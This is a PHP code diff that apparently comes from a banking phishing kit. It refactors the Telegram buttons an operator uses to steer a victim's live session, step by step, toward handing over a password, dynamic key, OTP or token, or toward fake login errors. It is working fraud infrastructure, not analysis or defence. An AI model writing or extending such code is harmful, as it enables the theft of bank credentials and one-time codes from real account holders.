@@ -882,70 +882,8 @@ try {
                 $message .= "\n⏰ " . ($data['timestamp'] ?? date('Y-m-d H:i:s'));
                 $message .= "\n🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
                 
-                // Botones genéricos basados en el step
-                $buttons = [];
-                
-                if ($step === 'login') {
-                    $buttons = [
-                        [
-                            ['text' => '❌ Error Login', 'callback_data' => "{$banco}_error_login|{$sessionId}"],
-                            ['text' => '📝 Pedir Contraseña', 'callback_data' => "{$banco}_request_password|{$sessionId}"]
-                        ],
-                        [
-                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
-                        ]
-                    ];
-                } elseif ($step === 'password') {
-                    $buttons = [
-                        [
-                            ['text' => '❌ Error Password', 'callback_data' => "{$banco}_error_password|{$sessionId}"],
-                            ['text' => '🔢 Pedir Dinámica', 'callback_data' => "{$banco}_request_dinamica|{$sessionId}"]
-                        ],
-                        [
-                            ['text' => '📲 Pedir OTP', 'callback_data' => "{$banco}_request_otp|{$sessionId}"],
-                            ['text' => '🔐 Pedir Token', 'callback_data' => "{$banco}_request_token|{$sessionId}"]
-                        ],
-                        [
-                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
-                        ]
-                    ];
-                } elseif ($step === 'dinamica') {
-                    $buttons = [
-                        [
-                            ['text' => '❌ Error Dinámica', 'callback_data' => "{$banco}_error_dinamica|{$sessionId}"],
-                            ['text' => '📲 Pedir OTP', 'callback_data' => "{$banco}_request_otp|{$sessionId}"]
-                        ],
-                        [
-                            ['text' => '🔐 Pedir Token', 'callback_data' => "{$banco}_request_token|{$sessionId}"],
-                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
-                        ]
-                    ];
-                } elseif ($step === 'otp') {
-                    $buttons = [
-                        [
-                            ['text' => '❌ Error OTP', 'callback_data' => "{$banco}_error_otp|{$sessionId}"],
-                            ['text' => '🔐 Pedir Token', 'callback_data' => "{$banco}_request_token|{$sessionId}"]
-                        ],
-                        [
-                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
-                        ]
-                    ];
-                } elseif ($step === 'token') {
-                    $buttons = [
-                        [
-                            ['text' => '❌ Error Token', 'callback_data' => "{$banco}_error_token|{$sessionId}"],
-                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
-                        ]
-                    ];
-                } else {
-                    // Botones genéricos para otros steps
-                    $buttons = [
-                        [
-                            ['text' => '✅ Continuar', 'callback_data' => "{$banco}_continue|{$sessionId}"],
-                            ['text' => '❌ Rechazar', 'callback_data' => "{$banco}_reject|{$sessionId}"]
-                        ]
-                    ];
-                }
+                // Usar configuración de botones del banco
+                $buttons = BankConfig::generateTelegramButtons($banco, $step, $sessionId);
                 
                 $result = $telegram->sendMessageWithButtons($message, $buttons);
                 
